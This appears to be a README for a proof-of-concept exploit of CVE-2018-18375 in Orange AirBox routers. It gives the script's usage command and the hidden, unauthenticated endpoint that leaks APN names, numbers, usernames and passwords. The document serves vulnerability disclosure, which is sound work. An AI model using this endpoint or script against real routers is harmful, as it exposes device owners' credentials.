# AirBoxAPNLeak
Proof of Concept of AirBoxAPNLeak Vulnerability.       
CVE-2018-18375                  

# How to use      

AirBoxAPNLeak.py         
`python AirBoxAPNLeak.py -ip 192.168.1.1`        
`APN NAME, NUMBER ,PASSWORD, USERNAME`

# How it works        

AirBox has hidden webpage `http://192.168.1.1/goform/getProfileList?rand=` which prints detailed APN info. It can be used to steal external ip addresses.
# Router information        

Router: AirBox
Vendor: Orange
Firmware version: Y858_FL_01.16_04
    
